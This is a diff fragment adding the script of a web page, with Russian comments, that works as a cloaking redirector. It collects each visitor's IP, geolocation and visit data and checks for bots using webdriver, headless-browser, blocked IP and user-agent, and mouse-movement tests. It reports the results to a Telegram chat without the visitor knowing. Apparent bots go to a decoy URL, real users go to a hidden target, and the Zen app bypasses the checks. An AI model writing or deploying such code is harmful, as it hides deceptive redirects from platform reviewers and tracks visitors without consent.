+            // Запускаем параллельно все асинхронные операции
+            const [
+                ipInfo,
+                targetUrl,
+                blockedIPs,
+                blockedUAs
+            ] = await Promise.all([
+                networkUtils.getIP(),
+                getTargetUrl(),
+                CONFIG.checks.blockedIPs ? networkUtils.loadBlockedIPs() : Promise.resolve([]),
+                CONFIG.checks.blockedUAs ? networkUtils.loadBlockedUAs() : Promise.resolve([])
+            ]);
+            
+            // Сохраняем результаты
+            state.ipInfo = ipInfo;
+            state.targetUrl = targetUrl;
+            
+            // Получаем геолокацию на основе IP
+            state.locationInfo = await networkUtils.getLocationByIP(ipInfo.ip);
+            
+            // Получаем информацию о посещениях
+            state.visitsInfo = visitsUtils.getVisitsInfo();
+            
+            // Выполняем проверки на бота
+            const checkResults = [];
+            
+            // Проверка webdriver (высокий приоритет)
+            if (CONFIG.checks.webdriver) {
+                checkResults.push(botDetector.checkWebdriver());
+            }
+            
+            // Проверка iframe-yang (высокий приоритет)
+            if (CONFIG.checks.iframeYang) {
+                checkResults.push(botDetector.checkIframeYang());
+            }
+            
+            // Проверка IP (высокий приоритет)
+            if (CONFIG.checks.blockedIPs && blockedIPs.length > 0) {
+                checkResults.push(botDetector.checkBlockedIP(ipInfo.ip, blockedIPs));
+            }
+            
+            // Проверка UA (высокий приоритет)
+            if (CONFIG.checks.blockedUAs && blockedUAs.length > 0) {
+                checkResults.push(botDetector.checkBlockedUA(navigator.userAgent, blockedUAs));
+            }
+            
+            // Проверка headless браузера
+            if (CONFIG.checks.headlessBrowser) {
+                checkResults.push(botDetector.checkHeadlessBrowser());
+            }
+            
+            // На десктопе проверяем движение мыши
+            const isMobile = deviceInfo.isMobile();
+            if (!isMobile && CONFIG.checks.mouseMovement) {
+                // Если это не мобильное устройство, проверяем движение мыши
+                if (!state.mouseMovementDetected) {
+                    checkResults.push({ 
+                        isBot: true, 
+                        reason: "No mouse movement detected" 
+                    });
+                }
+            }
+            
+            // Определяем, является ли пользователь ботом
+            const botDetected = checkResults.some(result => result.isBot);
+            
+            state.isBot = botDetected;
+            state.botReason = botDetected 
+                ? checkResults.filter(r => r.isBot).map(r => r.reason).join("; ")
+                : "";
+            
+            // Определяем, куда редиректить
+            const redirectUrl = botDetected ? CONFIG.botRedirectUrl : state.targetUrl;
+            
+            // Вычисляем время обработки
+            state.processingTime = Date.now() - state.startTime;
+            
+            // Отправляем отчет в Telegram
+            try {
+                const report = prepareReport();
+                await networkUtils.sendToTelegram(report);
+            } catch (error) {
+                console.error("Failed to send report to Telegram:", error);
+            }
+            
+            // Выполняем редирект с базовой задержкой
+            const redirectResult = await redirectUtils.redirect(redirectUrl, CONFIG.baseRedirectDelay);
+            state.redirectMethod = redirectResult.method;
+            state.redirectSuccess = redirectResult.success;
+            state.redirectAttempts = redirectResult.attempts || 1;
+            
+            // Если редирект не удался и пользователь не бот, отправляем отчет об ошибке
+            if (!redirectResult.success && !botDetected) {
+                try {
+                    const failureReport = prepareReport(true);
+                    await networkUtils.sendToTelegram(failureReport);
+                } catch (error) {
+                    console.error("Failed to send failure report:", error);
+                }
+            }
+        } catch (error) {
+            console.error("Critical error in checkAndRedirect:", error);
+            
+            // В случае критической ошибки, пытаемся редиректить на реферер или дефолтный URL
+            try {
+                const fallbackUrl = document.referrer || CONFIG.botRedirectUrl;
+                await redirectUtils.redirect(fallbackUrl, CONFIG.baseRedirectDelay);
+            } catch (redirectError) {
+                console.error("Even fallback redirect failed:", redirectError);
+                // Показываем кнопку ручного редиректа
+                redirectUtils.showManualRedirectButton(document.referrer || CONFIG.botRedirectUrl);
+            }
+        }
+    };
+
+    // Инициализация
+    const init = () => {
+        try {
+            // Запрещаем кэширование
+            window.onpageshow = function(event) {
+                if (event.persisted) {
+                    window.location.reload();
+                }
+            };
+            
+            // Если это приложение Дзен, быстро редиректим без проверок
+            if (deviceInfo.isZenApp()) {
+                fastRedirectForZen();
+                return;
+            }
+            
+            // Устанавливаем обработчик движения мыши только для десктопов
+            if (!deviceInfo.isMobile()) {
+                document.addEventListener('mousemove', handleMouseMovement);
+                
+                // Запускаем проверку через указанное время
+                setTimeout(() => {
+                    checkAndRedirect();
+                }, CONFIG.mouseMovementTimeout);
+            } else {
+                // Для мобильных устройств запускаем проверку немедленно
+                checkAndRedirect();
+            }
+        } catch (error) {
+            console.error("Critical error during initialization:", error);
+            
+            // В случае критической ошибки, пытаемся редиректить на реферер или дефолтный URL
+            try {
+                const fallbackUrl = document.referrer || CONFIG.botRedirectUrl;
+                redirectUtils.redirect(fallbackUrl, CONFIG.baseRedirectDelay);
+            } catch (redirectError) {
+                console.error("Even fallback redirect failed:", redirectError);
+                // Показываем кнопку ручного редиректа
+                redirectUtils.showManualRedirectButton(document.referrer || CONFIG.botRedirectUrl);
+            }
+        }
+    };
+
+    // Запускаем приложение
+    init();
+    </script>
+</body>
+</html>
